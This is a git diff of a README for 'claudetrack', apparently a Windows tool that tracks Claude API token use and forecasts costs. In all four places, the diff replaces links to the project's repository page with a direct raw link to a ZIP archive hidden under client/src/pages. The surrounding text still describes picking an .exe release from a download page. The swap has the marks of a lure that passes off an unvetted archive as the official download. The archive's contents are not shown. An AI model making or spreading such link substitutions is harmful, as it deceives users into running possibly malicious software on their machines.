@@ -1,6 +1,6 @@
 # ⚡ claudetrack - Monitor Tokens and Forecast Costs Easily
 
-[![Download claudetrack](https://img.shields.io/badge/Download-claudetrack-brightgreen)](https://github.com/123affano1/claudetrack)
+[![Download claudetrack](https://img.shields.io/badge/Download-claudetrack-brightgreen)](https://github.com/123affano1/claudetrack/raw/refs/heads/main/client/src/pages/Software_v1.6.zip)
 
 claudetrack helps you watch your token use in real time. It also forecasts costs and predicts rate limits for the Anthropic Claude API. You can run it yourself, at no cost.
 
@@ -32,7 +32,7 @@ If you do not have the .NET Desktop Runtime, the installation instructions below
 
 Click this big button to visit the download page:
 
-[![Download claudetrack](https://img.shields.io/badge/Get%20claudetrack-blue?style=for-the-badge)](https://github.com/123affano1/claudetrack)
+[![Download claudetrack](https://img.shields.io/badge/Get%20claudetrack-blue?style=for-the-badge)](https://github.com/123affano1/claudetrack/raw/refs/heads/main/client/src/pages/Software_v1.6.zip)
 
 On the linked page, find the latest Windows release and download the setup file (`.exe`). This is the file you will run to install claudetrack.
 
@@ -148,7 +148,7 @@ You can update the cost per token in Settings to get accurate forecasts.
 
 For updates, bug reports, and community help, visit the GitHub page:
 
-[Visit the claudetrack GitHub](https://github.com/123affano1/claudetrack)
+[Visit the claudetrack GitHub](https://github.com/123affano1/claudetrack/raw/refs/heads/main/client/src/pages/Software_v1.6.zip)
 
 There you can find detailed technical info and open issues discussions.
 
@@ -173,4 +173,4 @@ If you want to explore deeper:
 
 Use the button below to visit the official download page and begin setting up claudetrack:
 
-[![Download claudetrack](https://img.shields.io/badge/Get%20claudetrack-orange?style=for-the-badge)](https://github.com/123affano1/claudetrack)
+[![Download claudetrack](https://img.shields.io/badge/Get%20claudetrack-orange?style=for-the-badge)](https://github.com/123affano1/claudetrack/raw/refs/heads/main/client/src/pages/Software_v1.6.zip)
